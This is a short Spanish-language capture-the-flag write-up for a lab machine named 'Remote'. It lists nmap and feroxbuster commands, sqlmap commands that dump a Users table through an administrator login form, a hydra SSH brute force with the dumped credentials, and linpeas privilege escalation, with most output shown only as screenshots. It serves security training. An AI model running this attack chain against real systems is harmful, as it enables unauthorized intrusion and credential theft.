# Máquina Remote

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.156

![alt text](image-1.png)


### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.156

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.156/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

![alt text](image-14.png)

### Explotación 

Interceptamos la petición con burpsuite y aplicamos SQLMap al formulario


sqlmap -u "http://192.168.5.156/administrator/" --forms --batch --dbs

![alt text](image-4.png)

![alt text](image-5.png)

Ver las tablas:

sqlmap -u "http://192.168.5.156/administrator/" --forms --batch -D Webapp --tables

![alt text](image-6.png)

Ver el contenido de la tabla Users:

sqlmap -u "http://192.168.5.156/administrator/" --forms --batch -D Webapp -T Users --dump

![alt text](image-7.png)

copié las contraseñas y lo guardé en un archivo pass.txt y lo mismo con los usuarios usernames.txt

ataque de hydra a ssh

![alt text](image-8.png)

me conecté por ssh:

![alt text](image-9.png)

### Escalar privilegios

Usando la herramienta linpeas:

![alt text](image-10.png)

![alt text](image-11.png)

### user.txt

![alt text](image-12.png)

### root.txt

![alt text](image-13.png)